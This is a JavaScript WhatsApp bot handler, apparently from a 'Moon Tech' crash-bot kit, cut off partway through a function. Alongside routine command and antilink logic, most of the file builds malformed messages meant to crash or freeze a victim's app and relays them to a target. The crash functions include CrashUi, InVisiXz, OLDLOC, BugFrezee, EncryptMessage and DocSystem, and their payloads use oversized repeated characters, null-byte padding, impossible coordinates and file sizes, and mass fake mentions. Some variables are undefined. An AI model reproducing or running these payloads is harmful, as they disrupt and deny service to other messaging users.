module.exports = async (ZoO, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
/*const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : */
const prefix = "."
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const To = ["https://i.postimg.cc/1tHyw0wH/zerodev.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const Tol = ["https://pomf2.lain.la/f/610l8iwo.mp3"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const Premium = JSON.parse(fs.readFileSync('./Databases/database/murbug.json'))
const owner = JSON.parse(fs.readFileSync('./Databases/database/owner.json'))
const pantek = ["https://pomf2.lain.la/f/610l8iwo.mp3"]
const sound1 = pantek[Math.floor(Math.random() * pantek.length)]
const Toll = ["https://pomf2.lain.la/f/610l8iwo.mp3"]
const sound2 = Toll[Math.floor(Math.random() * Toll.length)]
const Tolll = ["https://pomf2.lain.la/f/610l8iwo.mp3"]
const sound3 = Tolll[Math.floor(Math.random() * Tolll.length)]
const Mek = ["https://pomf2.lain.la/f/610l8iwo.mp3"]
const sound4 = Mek[Math.floor(Math.random() * Mek.length)]
const wdh = ["https://pomf2.lain.la/f/610l8iwo.mp3"]
const sound5 = wdh[Math.floor(Math.random() * wdh.length)]
const pol = ["https://pomf2.lain.la/f/610l8iwo.mp3"]
const sound6 = pol[Math.floor(Math.random() * pol.length)]
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const jsobfus = require('javascript-obfuscator');
const botNumber = await ZoO.decodeJid(ZoO.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const kontol = m.key.fromMe ? ZoO.user.id.split(':')[0x0] + '@s.whatsapp.net' || ZoO.user.id : m.key.participant || m.key.remoteJid;
const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ZoO.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const qtext = q = args.join(" ")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./Databases/function.js')
const antilink = JSON.parse(fs.readFileSync('./Databases/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./Databases/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./Databases/database/contacts.json"))
const kosong = fs.readFileSync("./Databases/kosong.jpg")
const { teksCrashUi } = require("./Databases/database/virtex.js")
const { teksInVisiXz } = require("./Databases/database/delay.js")
const { buttonvirus } = require("./Databases/database/buttonvirus.js")
const { explosion } = require("./Databases/vir/bugcrash.js")
const { Veoni } = require("./Databases/vir/xnaf.js")
const { old1, old2, old3 } = require("./Databases/vir/bugold.js")
const { Cluex } = require("./Databases/database/ClueX.js")
const { pinterest, pinterest2, mediafire, tiktokDl } = require('./Databases/scraper');

/*FUNCTION OBFUSCATE*/
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `ᴘᴜᴛᴢᴢ - ᴍᴏᴏɴ ᴛᴇᴄʜ`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(owner), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `ᴀʀᴋ ᴍᴏᴏɴ`
}}}

if (isGroup) {
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await ZoO.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}}

if (isGroup) {
if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Bot Whatsapp Realtime`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `ᴀʀᴋ ᴍᴏᴏɴ`,jpegThumbnail: ""}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363322606603161@newsletter`,
newsletterName: `ᴘᴜᴛᴢᴢ - ᴍᴏᴏɴ ᴛᴇᴄʜ`,
jpegThumbnail: "",
caption: `ᴀʀᴋ ᴍᴏᴏɴ`,
inviteExpiration: Date.now() + 1814400000
}
}}

const Out = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnailUrl": kosong, //image 0kb
 "itemCount": 999999999,
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `ᴀᴛᴛᴀᴄᴋ ʙʏ ᴍᴏᴏɴ ɴᴏ ᴄᴏᴜɴᴛᴇʀ`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `ᴀʀᴋ ᴍᴏᴏɴ`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285693403858:+6285693403858\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

ZoO.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

async function loadingx() {
      var loadingz = [
        "> *🕘 L O*",
        "> *🕣 L O A*",
        "> *🕠 L O A D*",
        "> *🕔 L O A D I*",
        "> *🕟 L O A D I N*",
        "> *🕔 L O A D I N G*",
        "> *🕔 L O A D I N G*",
        "> *🕐 L O A D I N G*",
        "> *🕧 L O A D I N G*",
        "*SUKSES SEND BUG ✅*",
      ];
      let { key } = await ZoO.sendMessage(m.chat, {
        text: "*OKE OTW SEND BUG 💀*",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await VxoZap.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
    
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


/*QUOTED BUG SENDER*/
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}

/*BUG SENDER CRASH HARD*/
    async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ CrazyCrash ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻ MoonCrash ⿻\n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ MoonCrash ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ CrazyCrash ⿻","sections":[{"title":"MOON IS HERE ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY MOON TECH","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await ZoO.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑"));
    }

    async function InVisiXz(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑🦠",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑̤",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"🎭⃟༑⌁⃰𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑ཀ͜͡😈' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑ϟ","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"🎭⃟༑⌁⃰𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑ཀ͜͡😈","sections":[{"title":"𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑 ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY MOON TECH","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VisiX,
        }
      );

      await ZoO.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑"));
    }

async function InVisiLoc(X, ThM, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "⭑̤▾ ⿻ 𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑 ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                  locationMessage: {
                    degreesLatitude: -999.03499999999999,
                    degreesLongitude: 922.999999999999,
                    name: "⚝𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑⚝",
                    address: "🎭⃟༑⌁⃰𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑ཀ͜͡😈",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "",
                },
                nativeFlowMessage: {
                  messageParamsJson: " 𝐌𝐢𝐬𝐭𝐞𝐫𝐢𝐮𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐏𝐮𝐭𝐳𝐳♻️ ",
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: {
                        title: "🎭⃟༑⌁⃰𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑ཀ͜͡😈",
                        sections: [
                          {
                            title: "𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑 ϟ",
                            rows: [],
                          },
                        ],
                      },
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: {},
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: EsQl,
        }
      );
      await VxoZap.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ Moon Tech ⿻ ▾⭑"));
    }

/*BARA FUNCTION*/

async function OLDLOC(target, QBug) {
var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦾ".repeat(20) + "@1".repeat(50000)
        },
        nativeFlowMessage: {
          messageParamsJson: " ꦾ".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await ZoO.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id })
};

async function BugFrezee(target) {
            ZoO.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑🤓" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "😂⃟⃟⃟⃟⃚ ͢𝄽𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑𝄽⃟⃟⃟🇮🇩",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
        async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await ZoO.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};

        async function DocSystem(target) {
            let virtex = "😂⃟⃟⃟⃟⃚𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑𝄽⃟⃟⃟🇮🇩";

            ZoO.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Putzz || Moon Tech" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        async function DocSystem2(target) {
            ZoO.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "MOON ⚔️" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "KILLERBYMOON",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "putzzdragons@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
        async function DocSystem3(target) {
            ZoO.relayMessage(target, {
                viewOnceMessage: {
                    message: {
